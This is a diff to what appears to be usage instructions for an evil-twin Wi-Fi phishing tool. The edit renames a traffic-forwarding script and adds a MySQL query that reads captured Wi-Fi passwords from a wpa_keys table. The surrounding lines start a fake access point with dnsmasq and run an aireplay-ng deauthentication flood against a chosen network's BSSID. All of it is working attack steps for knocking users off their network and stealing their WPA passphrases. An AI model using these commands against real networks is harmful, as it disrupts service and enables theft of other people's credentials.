@@ -70,7 +70,7 @@ cd /var/www/html/configuration_files
 
 run Forward traffic>
 
-./iptablesRules.sh
+./iproute.sh
 
 Turn on the Fake Access Point
 
@@ -87,3 +87,6 @@ dnsmasq -C dnsmasq.conf -d
 if you want to down the wifi type
 
 aireplay-ng -deauth 0 -a {bssid wifi} wlan0mon
+
+show password wifi in mysql>
+select * from wpa_keys;
